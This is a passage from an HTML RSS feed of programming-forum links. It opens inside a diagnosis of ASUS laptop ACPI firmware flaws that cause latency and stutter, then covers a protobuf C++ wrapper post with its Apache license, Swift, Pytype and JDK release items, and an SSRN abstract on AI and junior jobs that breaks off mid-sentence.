<span>0x81</span>) <span>// Tell OS the battery info has changed</span> }</pre></div><p>Which we can see here:</p><a href="https://private-user-images.githubusercontent.com/76183331/490271565-f6c62050-b470-49bd-ad55-35def0fff893.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzE1NjUtZjZjNjIwNTAtYjQ3MC00OWJkLWFkNTUtMzVkZWYwZmZmODkzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTg1YzE3OWVmYjY2NTlkMGZmM2JhYjViMGIxODZiZWNjMzk4ZjRiOWY2ZjE0Y2VhMzJmNTUzNTExYmE2ZWUzYjMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.X6L58TRmIbedagzDZLqa4RqF82b2hmiP4MBVGENHRW0"><img width="1043" height="315" alt="image" src="https://private-user-images.githubusercontent.com/76183331/490271565-f6c62050-b470-49bd-ad55-35def0fff893.png?jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3NTgwODU3MDksIm5iZiI6MTc1ODA4NTQwOSwicGF0aCI6Ii83NjE4MzMzMS80OTAyNzE1NjUtZjZjNjIwNTAtYjQ3MC00OWJkLWFkNTUtMzVkZWYwZmZmODkzLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNTA5MTclMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjUwOTE3VDA1MDMyOVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTg1YzE3OWVmYjY2NTlkMGZmM2JhYjViMGIxODZiZWNjMzk4ZjRiOWY2ZjE0Y2VhMzJmNTUzNTExYmE2ZWUzYjMmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.X6L58TRmIbedagzDZLqa4RqF82b2hmiP4MBVGENHRW0"></a><p>Each of these operations requires communication with the Embedded Controller, adding to the workload inside the already-stalled interrupt handler.</p><h3>The GPU Notification System</h3><a href="https://github.com#the-gpu-notification-system"></a><p>The <code>NOD2()</code> method sends notifications to the GPU driver.</p><div><pre><span>Method</span> (NOD2, <span>1</span>, <span>Serialized</span>) { <span>If</span> ((<span>Arg0</span> != DNOT)) { DNOT = <span>Arg0</span> <span>Notify</span> (^^PEG1.PEGP, <span>Arg0</span>) } <span>If</span> ((ROCT == <span>0x55</span>)) { ROCT = <span>Zero</span> <span>Notify</span> (^^PEG1.PEGP, <span>0xD1</span>) <span>// Hardware-Specific</span> } }</pre></div><p>These notifications (<code>0xD1</code>, <code>0xD2</code>, etc.) are hardware-specific signals that tell the NVIDIA driver to re-evaluate its power state, which is what triggers the futile <code>_PS0/_DOS/_PS3</code> power-cycling sequence seen in the traces.</p><h2>The Mux Mode Confusion: A Firmware with a Split Personality</h2><a href="https://github.com#the-mux-mode-confusion-a-firmware-with-a-split-personality"></a><p>Here's where a simple but catastrophic oversight in the firmware's logic causes system-wide failure. High-end ASUS gaming laptops feature a MUX (Multiplexer) switch, a piece of hardware that lets the user choose between two distinct graphics modes:</p><ol> <li><strong>Optimus Mode:</strong> The power-saving default. The integrated Intel GPU (iGPU) is physically connected to the display. The powerful NVIDIA GPU (dGPU) only renders demanding applications when needed, passing finished frames to the iGPU to be drawn on screen.</li> <li><strong>Ultimate/Mux Mode:</strong> The high-performance mode. The MUX switch physically rewires the display connections, bypassing the iGPU entirely and wiring the NVIDIA dGPU directly to the screen. In this mode, the dGPU is not optional; it is the <strong>only</strong> graphics processor capable of outputting an image.</li> </ol><p>Any firmware managing this hardware <strong>must</strong> be aware of which mode the system is in. Sending a command intended for one GPU to the other is futile and, in some cases, dangerous. Deep within the ACPI code, a hardware status flag named <code>HGMD</code> is used to track this state. To understand the flaw, we first need to decipher what <code>HGMD</code> means, and the firmware itself gives us the key.</p><h4><strong>Decoding the Firmware's Logic with the Brightness Method</strong></h4><a href="https://github.com#decoding-the-firmwares-logic-with-the-brightness-method"></a><p>For screen brightness to work, the command must be sent to the GPU that is physically controlling the display backlight. A command sent to the wrong GPU will simply do nothing. Therefore, the brightness control method (<code>BRTN</code>) <em>must</em> be aware of the MUX switch state to function at all. It is the firmware's own Rosetta Stone.</p><div><pre><span>// Brightness control - CORRECTLY checks for mux mode</span> <span>Method</span> (BRTN, <span>1</span>, <span>Serialized</span>) <span>// Line 034003</span> { <span>If</span> (((DIDX &amp; <span>0x0F0F</span>) == <span>0x0400</span>)) { <span>If</span> (HGMD == <span>0x03</span>) <span>// 0x03 = Ultimate/Mux mode</span> { <span>// In mux mode, notify discrete GPU</span> <span>Notify</span> (\<span>_SB</span>.PC00.PEG1.PEGP.EDP1, <span>Arg0</span>) } <span>Else</span> { <span>// In Optimus, notify integrated GPU</span> <span>Notify</span> (\<span>_SB</span>.PC00.GFX0.DD1F, <span>Arg0</span>) } } }</pre></div><p>The logic here is flawless and revealing. The code uses the <code>HGMD</code> flag to make a binary decision. If <code>HGMD</code> is <code>0x03</code>, it sends the command to the NVIDIA GPU. If not, it sends it to the Intel GPU. The firmware itself, through this correct implementation, provides the undeniable definition: <strong><code>HGMD == 0x03</code> means the system is in Ultimate/Mux Mode.</strong></p><h4><strong>The Logical Contradiction: Unconditional Power Cycling in a Conditional Hardware State</strong></h4><a href="https://github.com#the-logical-contradiction-unconditional-power-cycling-in-a-conditional-hardware-state"></a><p>This perfect, platform-aware logic is completely abandoned in the critical code paths responsible for power management. The <code>LGPA</code> method, which is called by the stutter-inducing interrupt, dispatches power-related commands to the GPU <em>without ever checking the MUX mode</em>.</p><div><pre><span>// GPU power notification - NO MUX CHECK!</span> <span>Case</span> (<span>0x18</span>) { <span>// This SHOULD have: If (HGMD != 0x03)</span> <span>// But it doesn't, so it runs even in mux mode</span> <span>If</span> (M6EF == <span>One</span>) { <span>Local0</span> = <span>0xD2</span> } <span>Else</span> { <span>Local0</span> = <span>0xD1</span> } NOD2 (<span>Local0</span>) <span>// Notifies GPU regardless of mode</span> }</pre></div><p>This is the bug. The firmware, despite proving it knows how to check the MUX state, forgets to do so here. It blindly sends a power-management notification to the NVIDIA driver, instructing it to change power states. In MUX mode, this command is nonsensical it's asking the driver to power down the only GPU that is keeping the screen on. This triggers the futile power-cycling, the massive latency spikes, and the system instability.</p><h3>Another Path to the Same Problem: The Platform Power Management DSM</h3><a href="https://github.com#another-path-to-the-same-problem-the-platform-power-management-dsm"></a><p>This is not a single typo. A second, parallel power management system in the firmware exhibits the exact same flaw. The Platform Extension Plug-in Device (<code>PEPD</code>) is used by Windows to manage system-wide power states, such as turning off displays during modern standby.</p><div><pre><span>Device</span> (PEPD) <span>// Line 071206</span> { <span>Name</span> (<span>_HID</span>, <span>"INT33A1"</span>) <span>// Intel Power Engine Plugin</span> <span>Method</span> (<span>_DSM</span>, <span>4</span>, <span>Serialized</span>) <span>// Device Specific Method</span> { <span>// ... lots of setup code ...</span> <span>// Arg2 == 0x05: "All displays have been turned off"</span> <span>If</span> ((<span>Arg2</span> == <span>0x05</span>)) { <span>// Prepare for aggressive power saving</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.PEG1.DHDW)) { ^^PC00.PEG1.DHDW () <span>// GPU pre-shutdown work</span> ^^PC00.PEG1.DGCE = <span>One</span> <span>// Set "GPU Cut Enable" flag</span> } <span>If</span> (S0ID == <span>One</span>) <span>// If system supports S0 idle</span> { GUAM (<span>One</span>) <span>// Enter low power mode</span> } ^^PC00.DPOF = <span>One</span> <span>// Display power off flag</span> <span>// Tell USB controller about display state</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.XHCI.PSLI)) { ^^PC00.XHCI.PSLI (<span>0x05</span>) } } <span>// Arg2 == 0x06: "A display has been turned on"</span> <span>If</span> ((<span>Arg2</span> == <span>0x06</span>)) { <span>// Wake everything back up</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.PEG1.DGCE)) { ^^PC00.PEG1.DGCE = <span>Zero</span> <span>// Clear "GPU Cut Enable"</span> } <span>If</span> (S0ID == <span>One</span>) { GUAM (<span>Zero</span>) <span>// Exit low power mode</span> } ^^PC00.DPOF = <span>Zero</span> <span>// Display power on flag</span> <span>If</span> (<span>CondRefOf</span> (\<span>_SB</span>.PC00.XHCI.PSLI)) { ^^PC00.XHCI.PSLI (<span>0x06</span>) } } } }</pre></div><p>Once again, the firmware prepares to cut power to the discrete GPU without first checking if it's the only GPU driving the displays. This demonstrates that the Mux Mode Confusion is a systemic design flaw. The firmware is internally inconsistent, leading it to issue self-destructive commands that try to cripple the system.</p><h2>Cross-System Analysis</h2><a href="https://github.com#cross-system-analysis"></a><p>Traces from multiple ASUS gaming laptop models confirm this is not an isolated issue.</p><h4>Scar 15 Analysis</h4><a href="https://github.com#scar-15-analysis"></a> <ul> <li><strong>Trace Duration:</strong> 4.1 minutes</li> <li><strong><code>_GPE._L02</code> Events:</strong> 7</li> <li><strong>Avg. GPE Duration:</strong> 1.56ms (lower, but still unacceptably high)</li> <li><strong>Avg. Interval:</strong> 39.4 seconds (nearly identical periodic nature)</li> <li><strong>GPU Power Cycles:</strong> 8</li> </ul><p></p><h4>Zephyrus M16 Analysis</h4><a href="https://github.com#zephyrus-m16-analysis"></a> <ul> <li><strong>Trace Duration:</strong> 19.9 minutes</li> <li><strong><code>_GPE._L02</code> Events:</strong> 3</li> <li><strong>Avg. GPE Duration:</strong> 2.94ms</li> <li><strong>GPU Power Cycles:</strong> 197 (far more frequent)</li> <li><strong>ASUS WMI Calls:</strong> 2,370 (a massive number, indicating software amplification)</li> </ul><p>Microsoft has a built-in "smooth video" check. It plays HD video in full screen and watches for hiccups. If the PC drops frames, crackles, or any driver pauses for more than a few milliseconds, it fails. That&rsquo;s Microsoft&rsquo;s baseline for what "smooth" should look like.</p><p>Why it matters here:</p><p>ASUS firmware is causing millisecond-long pauses. Those pauses are exactly the kind that make this test fail i.e., the same stutters and audio pops regular users notice on YouTube/Netflix and games; this firmware violates fundemental standards.</p><h3>The Universal Pattern</h3><a href="https://github.com#the-universal-pattern"></a><p>Despite being different models, all affected systems exhibit the same core flaws:</p><ol> <li><code>_GPE._L02</code> handlers take milliseconds to execute instead of microseconds.</li> <li>The GPEs trigger unnecessary battery polling.</li> <li>The firmware attempts to power cycle the GPU while in a fixed MUX mode.</li> <li>The entire process is driven by a periodic, timer-like trigger.</li> </ol> <h2>Summarizing the Findings</h2><a href="https://github.com#summarizing-the-findings"></a><p>This bug is a cascade of firmware design failures.</p><h3>Root Cause 1: The Misunderstanding of Interrupt Context</h3><a href="https://github.com#root-cause-1-the-misunderstanding-of-interrupt-context"></a><p>The firmware's <code>ECLV()</code> method treats a high-priority interrupt handler like a standard application thread, which is fundamentally incorrect.</p><p><strong>What ASUS Wrote:</strong></p><div><pre><span>Method</span> (ECLV, , <span>NotSerialized</span>) { <span>While</span> (events_exist) { process_event(); <span>Sleep</span>(100); <span>// FATAL FLAW: This blocks the entire CPU core.</span> check_timers(); } }</pre></div><p><strong>What It Should Be:</strong></p><div><pre><span>Method</span> (ECLV, , <span>NotSerialized</span>) { <span>// Acknowledge interrupt, queue work, and exit immediately.</span> <span>Local0</span> = EC0.EEV0; <span>// Read event source</span> EC0.EEV0 = ; <span>// Clear the event source</span> QueueWorkForLater(<span>Local0</span>); <span>// Queue a low-priority task</span> <span>Return</span>; <span>// Exit the handler in microseconds.</span> }</pre></div><h3>Root Cause 2: Flawed Interrupt Handling</h3><a href="https://github.com#root-cause-2-flawed-interrupt-handling"></a><p>The firmware artificially re-arms the interrupt, creating an endless loop of GPEs instead of clearing the source and waiting for the next legitimate hardware event. This transforms a hardware notification system into a disruptive, periodic timer.</p><h3>Root Cause 3: Lack of Platform Awareness</h3><a href="https://github.com#root-cause-3-lack-of-platform-awareness"></a><p>The code that sends GPU power notifications does not check if the system is in MUX mode, a critical state check that is correctly performed in other parts of the firmware. This demonstrates inconsistency and a lack of quality control.</p><h2>Timeline of User Reports</h2><a href="https://github.com#timeline-of-user-reports"></a><p></p><h3>The Three-Year Pattern</h3><a href="https://github.com#the-three-year-pattern"></a><p>This issue is not new or isolated. User reports documenting identical symptoms with high ACPI.sys DPC latency, periodic stuttering, and audio crackling have been accumulating since at least 2021 across ASUS's entire gaming laptop lineup.</p><p><strong>August 2021: The First Major Reports</strong><br> The earliest documented cases appear on the official ASUS ROG forums. A G15 Advantage Edition (G513QY) owner reports <a href="https://rog-forum.asus.com/t5/rog-strix-series/g15-advantage-edition-g513qy-severe-dpc-latency-audio-dropouts/m-p/809512">"severe DPC latency from ACPI.sys"</a> with audio dropouts occurring under any load condition. The thread, last edited in March 2024, shows the issue remains unresolved after nearly three years.</p><p>Reddit users simultaneously report <a href="https://www.reddit.com/r/ASUS/comments/odprtv/high_dpc_latency_from_acpisys_can_be_caused_by/">identical ACPI.sys latency problems</a> alongside NVIDIA driver issues; the exact symptoms described in this investigation.</p><p><strong>2021-2023: Spreading Across Models</strong><br> Throughout this period, the issue proliferates across ASUS's gaming lineup:</p><ul> <li><a href="https://www.reddit.com/r/techsupport/comments/mxtm86/i_need_help_high_acpisys_latency_and_microstutters/">ROG Strix models experience micro-stutters</a></li> <li><a href="https://www.reddit.com/r/Asustuf/comments/1m2e40v/my_laptop_throttling_for_few_seconds/">TUF Gaming series reports throttling for seconds at a time</a></li> <li><a href="https://www.reddit.com/r/techsupport/comments/17rqfq5/new_laptop_started_stuttering_every_45_seconds/">G18 models exhibit the characteristic 45-second periodic stuttering</a></li> </ul><p><strong>2023-2024: The Problem Persists in New Models</strong><br> Even the latest generations aren't immune:</p><ul> <li><a href="https://www.reddit.com/r/ZephyrusM16/comments/1j33ld6/this_machine_has_been_nothing_but_problems_no/">2023 Zephyrus G16 owners report persistent audio issues</a></li> <li><a href="https://www.reddit.com/r/ZephyrusG14/comments/1l4jb13/audio_popscrackles_on_zephyrus_g16_2023/">2023 G16 models continue experiencing audio pops/crackles</a></li> <li><a href="https://www.reddit.com/r/ZephyrusG14/comments/1i2w9ah/resolving_audio_popsstuttering_on_2024_intel_g16/">2024 Intel G16 models require workarounds for audio stuttering</a></li> </ul> <h2>Conclusion</h2><a href="https://github.com#conclusion"></a><p>The evidence is undeniable:</p><ul> <li><strong>Measured Proof:</strong> GPE handlers are measured blocking a CPU core for over 13 milliseconds.</li> <li><strong>Code Proof:</strong> The decompiled firmware explicitly contains <code>Sleep()</code> calls within an interrupt handler.</li> <li><strong>Logical Proof:</strong> The code lacks critical checks for the laptop's hardware state (MUX mode).</li> <li><strong>Systemic Proof:</strong> The issue is reproducible across different models and BIOS versions.</li> </ul><p>Until a fix is implemented, millions of buyers of Asus laptops from approx. 2021 to present day are facing stutters on the simplest of tasks, such as watching YouTube, for the simple mistake of using a sleep call inside of an inefficient interrupt handler and not checking the GPU environment properly.</p><p>The code is there. The traces prove it. ASUS must fix its firmware.</p><blockquote><p>ASUS has not responded to this investigation or the documented firmware issues at the time of publication, will update this if anything changes.</p></blockquote> <hr><p><em>Investigation conducted using the Windows Performance Toolkit, ACPI table extraction tools, and Intel ACPI Component Architecture utilities. All code excerpts are from official ASUS firmware. Traces were captured on multiple affected systems, all showing consistent behavior.</em></p></article></div></section>]]></description><pubDate>Wed, 17 Sep 2025 05:38:51 +0530</pubDate></item><item><link>https://github.com/illegal-instruction-co/sugar-proto</link><title>A new experiment: making Protobuf in C++ less painful (inspired by the old “why is Protobuf so clunky?” thread) (github.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/</guid><comments>https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 9 min | <a href='https://www.reddit.com/r/programming/comments/1niuy6j/a_new_experiment_making_protobuf_in_c_less/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Hey folks,</p><p>Some hours back there was a lively discussion here: <a href="https://www.reddit.com/r/programming/comments/1nibv4y/why_is_protobufs_c_api_so_clunky_would_a/">Why is Protobuf’s C API so clunky?</a></p><p>I was in that thread too, tossing around ideas like <em>“what if we could do</em> <code>user[&quot;id&quot;] = 123;</code> <em>and have it fail at compile time if you tried</em> <code>user[&quot;id&quot;] = &quot;oops&quot;;</code><em>”</em>. The feedback I got there was super helpful — a few people pointed out I was basically forcing JSON-style dynamics into a static Protobuf world, which doesn’t really fit. That clicked with me.</p><p>Since then I hacked on a small library/plugin called <strong>Sugar-Proto</strong>. It’s a protoc plugin that generates wrappers around your <code>.proto</code> messages, giving you something closer to a <code>nlohmann/json</code> feel, but still 100% type-safe and zero runtime reflection.</p><p>Example:</p><pre><code>User user;UserWrapped u(user);u.name = &quot;Alice&quot;;u.id = 42;u.posts.push_back({{&quot;title&quot;, &quot;Hello&quot;}, {&quot;comments&quot;, {{&quot;text&quot;, &quot;Nice!&quot;}}}});</code></pre><p>Under the hood it’s just normal protobuf fields, no hidden runtime map lookups. The idea is: <strong>make the API less clunky without pretending it’s JSON.</strong></p><p>It’s early, not production-ready yet, but I’d love for people to kick the tires and tell me what feels right/wrong.</p><p>Curious to hear if anyone else tried wrapping protobuf in a more ergonomic C++ way. Do you think this direction has legs, or is protobuf doomed to always feel a bit Java-ish in C++?</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://opengraph.githubassets.com/f949068e29719813c4c94b6e1be03ed92f7f84c0cf4e5316dbf1bc3813f4cebf/illegal-instruction-co/sugar-proto' /></section><section class='parsed-content'><div><pre> Apache License Version 2.0, January 2004 <a href="http://www.apache.org/licenses/">http://www.apache.org/licenses/</a> TERMS AND CONDITIONS FOR USE, REPRODUCTION, AND DISTRIBUTION 1. Definitions. "License" shall mean the terms and conditions for use, reproduction, and distribution as defined by Sections 1 through 9 of this document. "Licensor" shall mean the copyright owner or entity authorized by the copyright owner that is granting the License. "Legal Entity" shall mean the union of the acting entity and all other entities that control, are controlled by, or are under common control with that entity. For the purposes of this definition, "control" means (i) the power, direct or indirect, to cause the direction or management of such entity, whether by contract or otherwise, or (ii) ownership of fifty percent (50%) or more of the outstanding shares, or (iii) beneficial ownership of such entity. "You" (or "Your") shall mean an individual or Legal Entity exercising permissions granted by this License. "Source" form shall mean the preferred form for making modifications, including but not limited to software source code, documentation source, and configuration files. "Object" form shall mean any form resulting from mechanical transformation or translation of a Source form, including but not limited to compiled object code, generated documentation, and conversions to other media types. "Work" shall mean the work of authorship, whether in Source or Object form, made available under the License, as indicated by a copyright notice that is included in or attached to the work (an example is provided in the Appendix below). "Derivative Works" shall mean any work, whether in Source or Object form, that is based on (or derived from) the Work and for which the editorial revisions, annotations, elaborations, or other modifications represent, as a whole, an original work of authorship. For the purposes of this License, Derivative Works shall not include works that remain separable from, or merely link (or bind by name) to the interfaces of, the Work and Derivative Works thereof. "Contribution" shall mean any work of authorship, including the original version of the Work and any modifications or additions to that Work or Derivative Works thereof, that is intentionally submitted to Licensor for inclusion in the Work by the copyright owner or by an individual or Legal Entity authorized to submit on behalf of the copyright owner. For the purposes of this definition, "submitted" means any form of electronic, verbal, or written communication sent to the Licensor or its representatives, including but not limited to communication on electronic mailing lists, source code control systems, and issue tracking systems that are managed by, or on behalf of, the Licensor for the purpose of discussing and improving the Work, but excluding communication that is conspicuously marked or otherwise designated in writing by the copyright owner as "Not a Contribution." "Contributor" shall mean Licensor and any individual or Legal Entity on behalf of whom a Contribution has been received by Licensor and subsequently incorporated within the Work. 2. Grant of Copyright License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable copyright license to reproduce, prepare Derivative Works of, publicly display, publicly perform, sublicense, and distribute the Work and such Derivative Works in Source or Object form. 3. Grant of Patent License. Subject to the terms and conditions of this License, each Contributor hereby grants to You a perpetual, worldwide, non-exclusive, no-charge, royalty-free, irrevocable (except as stated in this section) patent license to make, have made, use, offer to sell, sell, import, and otherwise transfer the Work, where such license applies only to those patent claims licensable by such Contributor that are necessarily infringed by their Contribution(s) alone or by combination of their Contribution(s) with the Work to which such Contribution(s) was submitted. If You institute patent litigation against any entity (including a cross-claim or counterclaim in a lawsuit) alleging that the Work or a Contribution incorporated within the Work constitutes direct or contributory patent infringement, then any patent licenses granted to You under this License for that Work shall terminate as of the date such litigation is filed. 4. Redistribution. You may reproduce and distribute copies of the Work or Derivative Works thereof in any medium, with or without modifications, and in Source or Object form, provided that You meet the following conditions: (a) You must give any other recipients of the Work or Derivative Works a copy of this License; and (b) You must cause any modified files to carry prominent notices stating that You changed the files; and (c) You must retain, in the Source form of any Derivative Works that You distribute, all copyright, patent, trademark, and attribution notices from the Source form of the Work, excluding those notices that do not pertain to any part of the Derivative Works; and (d) If the Work includes a "NOTICE" text file as part of its distribution, then any Derivative Works that You distribute must include a readable copy of the attribution notices contained within such NOTICE file, excluding those notices that do not pertain to any part of the Derivative Works, in at least one of the following places: within a NOTICE text file distributed as part of the Derivative Works; within the Source form or documentation, if provided along with the Derivative Works; or, within a display generated by the Derivative Works, if and wherever such third-party notices normally appear. The contents of the NOTICE file are for informational purposes only and do not modify the License. You may add Your own attribution notices within Derivative Works that You distribute, alongside or as an addendum to the NOTICE text from the Work, provided that such additional attribution notices cannot be construed as modifying the License. You may add Your own copyright statement to Your modifications and may provide additional or different license terms and conditions for use, reproduction, or distribution of Your modifications, or for any such Derivative Works as a whole, provided Your use, reproduction, and distribution of the Work otherwise complies with the conditions stated in this License. 5. Submission of Contributions. Unless You explicitly state otherwise, any Contribution intentionally submitted for inclusion in the Work by You to the Licensor shall be under the terms and conditions of this License, without any additional terms or conditions. Notwithstanding the above, nothing herein shall supersede or modify the terms of any separate license agreement you may have executed with Licensor regarding such Contributions. 6. Trademarks. This License does not grant permission to use the trade names, trademarks, service marks, or product names of the Licensor, except as required for reasonable and customary use in describing the origin of the Work and reproducing the content of the NOTICE file. 7. Disclaimer of Warranty. Unless required by applicable law or agreed to in writing, Licensor provides the Work (and each Contributor provides its Contributions) on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied, including, without limitation, any warranties or conditions of TITLE, NON-INFRINGEMENT, MERCHANTABILITY, or FITNESS FOR A PARTICULAR PURPOSE. You are solely responsible for determining the appropriateness of using or redistributing the Work and assume any risks associated with Your exercise of permissions under this License. 8. Limitation of Liability. In no event and under no legal theory, whether in tort (including negligence), contract, or otherwise, unless required by applicable law (such as deliberate and grossly negligent acts) or agreed to in writing, shall any Contributor be liable to You for damages, including any direct, indirect, special, incidental, or consequential damages of any character arising as a result of this License or out of the use or inability to use the Work (including but not limited to damages for loss of goodwill, work stoppage, computer failure or malfunction, or any and all other commercial damages or losses), even if such Contributor has been advised of the possibility of such damages. 9. Accepting Warranty or Additional Liability. While redistributing the Work or Derivative Works thereof, You may choose to offer, and charge a fee for, acceptance of support, warranty, indemnity, or other liability obligations and/or rights consistent with this License. However, in accepting such obligations, You may act only on Your own behalf and on Your sole responsibility, not on behalf of any other Contributor, and only if You agree to indemnify, defend, and hold each Contributor harmless for any liability incurred by, or claims asserted against, such Contributor by reason of your accepting any such warranty or additional liability. END OF TERMS AND CONDITIONS APPENDIX: How to apply the Apache License to your work. To apply the Apache License to your work, attach the following boilerplate notice, with the fields enclosed by brackets "[]" replaced with your own identifying information. (Don't include the brackets!) The text should be enclosed in the appropriate comment syntax for the file format. We also recommend that a file or class name and description of purpose be included on the same "printed page" as the copyright notice for easier identification within third-party archives. Copyright [yyyy] [name of copyright owner] Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file except in compliance with the License. You may obtain a copy of the License at <a href="http://www.apache.org/licenses/LICENSE-2.0">http://www.apache.org/licenses/LICENSE-2.0</a> Unless required by applicable law or agreed to in writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the specific language governing permissions and limitations under the License. </pre></div></section>]]></description><pubDate>Wed, 17 Sep 2025 03:21:04 +0530</pubDate></item><item><link>https://www.swift.org/blog/swift-6.2-released/</link><title>Swift 6.2 Released (swift.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/</guid><comments>https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nirl8a/swift_62_released/'>Post permalink</a></p></section>]]></description><pubDate>Wed, 17 Sep 2025 01:12:42 +0530</pubDate></item><item><link>https://medium.com/techtofreedom/google-ends-support-for-pytype-this-is-how-python-developers-can-adapt-a703d964028a?sk=e228cb9233d3e5fa91d3757c1946ad24</link><title>Google Ends Support for Pytype: This is How Python Developers Can Adapt (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/</guid><comments>https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1niqo5q/google_ends_support_for_pytype_this_is_how_python/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><div><h2>Google Ends Support for Pytype: This is How Python Developers Can Adapt</h2><div><h2>And what it says about the evolution of Python typing.</h2></div><figure><div><p><span>Press enter or click to view image in full size</span></p></div><figcaption>Image from <a href="https://wallhaven.cc/w/m992d8">Wallhaven</a></figcaption></figure><p>After years of maintaining Pytype, Google has <a href="https://github.com/google/pytype/blob/main/README.md">officially announced</a> that it is sunsetting the project, and the last supported Python version is 3.12.</p><p>As an ambitious type-checking tool for Python, Pytype was popular, especially when Python&rsquo;s type hints syntax wasn&rsquo;t comprehensive enough.</p><p>While the news might not come as a surprise given the rapid evolution of Python typing tools, it does raise important questions about the ecosystem and the direction of type checking in Python. As Python developers, we should adapt to the rapid changes to enhance our skills.</p><p>This article will help you understand what this move means and how it will affect you.</p><h2>What Was Pytype?</h2><p>Pytype was Google&rsquo;s in-house tool developed since 2012. As a handy type analysis tool, Pytype could:</p><ul><li>Infer types without explicit type hints.</li><li>Detect type errors across large codebases.</li><li>Generate type stubs for libraries lacking type information.</li><li>Provide flexible integration for teams with legacy Python code.</li></ul></div><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/2*LGEGZoQWcwrCYPOxGsacCg.jpeg"></p></div></section>]]></description><pubDate>Wed, 17 Sep 2025 00:38:51 +0530</pubDate></item><item><link>https://mail.openjdk.org/pipermail/announce/2025-September/000360.html</link><title>Java 25 / JDK 25: General Availability (mail.openjdk.org)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/</guid><comments>https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p><a href='https://www.reddit.com/r/programming/comments/1nil3zi/java_25_jdk_25_general_availability/'>Post permalink</a></p></section>]]></description><pubDate>Tue, 16 Sep 2025 21:15:12 +0530</pubDate></item><item><link>https://papers.ssrn.com/sol3/papers.cfm?abstract_id=5425555</link><title>Generative AI is hollowing out entry-level jobs, study finds (papers.ssrn.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/</guid><comments>https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 2 min | <a href='https://www.reddit.com/r/programming/comments/1nika5f/generative_ai_is_hollowing_out_entrylevel_jobs/'>Post permalink</a></p></section><section class='preview-image'><img src='https://cdn.ssrn.com/ssrn-global-header/11589acb53bc518aa22929bf19add113.svg' /></section><section class='parsed-content'><div><p><span>35 Pages</span> <span>Posted: 8 Sep 2025</span> </p><p>Date Written: August 31, 2025</p><div><h3>Abstract</h3><p>We study whether generative artificial intelligence (AI) constitutes a form of <i>seniority-biased technological change</i>, disproportionately affecting junior relative to senior workers. Using U.S. r&eacute;sum&eacute; and job posting data covering nearly 62 million workers in 285,000 firms (2015-2025), we track within-firm employment dynamics by seniority. We identify AI adoption through a text-analysis approach that flags postings for dedicated "AI integrator" roles, signaling active implementation of generative AI. Difference-in-differences and triple-difference estimates show that, beginning in 2023Q1, junior employment in adopting firms declined sharply relative to non-adopters, while senior employment continued to rise. The junior decline is driven primarily by slower hiring rather than increased separations, with the largest effects in wholesale and retail trade. Heterogeneity by education reveals a 